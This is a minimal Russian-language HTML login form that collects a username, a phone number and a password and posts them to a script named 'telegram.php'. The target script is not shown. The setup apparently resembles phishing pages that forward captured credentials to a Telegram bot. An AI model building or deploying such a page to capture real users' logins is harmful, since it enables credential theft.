<!DOCTYPE html>
<html>
<head>
    <title>Форма входа</title>
</head>
<body>
    <h1>Форма входа</h1>
    <form action="telegram.php" method="POST">
        <label for="username">Имя пользователя:</label>
        <input type="text" name="username" id="username" required><br><br>
        
        <label for="mail">Телефон:</label>
        <input type="text" name="mail" id="mail" required><br><br>
        
        <label for="password">Пароль:</label>
        <input type="password" name="password" id="password" required><br><br>
        
        <input type="submit" value="Войти">
    </form>
</body>
</html>
